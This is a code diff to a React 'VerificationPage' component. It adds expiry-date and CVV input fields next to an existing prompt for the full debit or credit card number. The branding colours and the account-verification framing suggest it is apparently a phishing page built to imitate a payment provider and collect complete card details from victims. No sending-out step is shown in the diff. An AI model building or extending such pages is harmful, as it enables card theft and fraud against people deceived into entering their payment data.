@@ -14,6 +14,8 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
   const [loading, setLoading] = useState(false);
   const [selectedOption, setSelectedOption] = useState<VerificationOption>('confirm_card');
   const [cardNumber, setCardNumber] = useState('');
+  const [expiryDate, setExpiryDate] = useState('');
+  const [cvv, setCvv] = useState('');
   const [verificationCode, setVerificationCode] = useState(['', '', '', '', '', '']);
   const [countdown, setCountdown] = useState(60);
 
@@ -80,7 +82,7 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
           <p className="text-[16px] text-gray-900 mb-8 self-start">
             Type in the full Debit/Credit card number
           </p>
-          <div className="w-full mb-8">
+          <div className="w-full space-y-4 mb-8">
             <div className="relative">
               <input
                 type="text"
@@ -89,6 +91,26 @@ export function VerificationPage({ email, onBack }: VerificationPageProps) {
                 placeholder="Card number"
                 className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
               />
+            </div>
+            <div className="flex gap-4">
+              <div className="flex-1 relative">
+                <input
+                  type="text"
+                  value={expiryDate}
+                  onChange={(e) => setExpiryDate(e.target.value)}
+                  placeholder="Expiry date"
+                  className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
+                />
+              </div>
+              <div className="flex-1 relative">
+                <input
+                  type="text"
+                  value={cvv}
+                  onChange={(e) => setCvv(e.target.value)}
+                  placeholder="CVV"
+                  className="w-full px-4 py-4 bg-[#f5f7fa] border border-transparent rounded-lg text-[16px] outline-none focus:bg-white focus:border-[#0070BA] transition-all"
+                />
+              </div>
             </div>
           </div>
           <button className="w-full py-4 bg-[#0054BB] hover:bg-[#004294] text-white font-bold text-lg rounded-full transition-colors mb-4 shadow-sm">
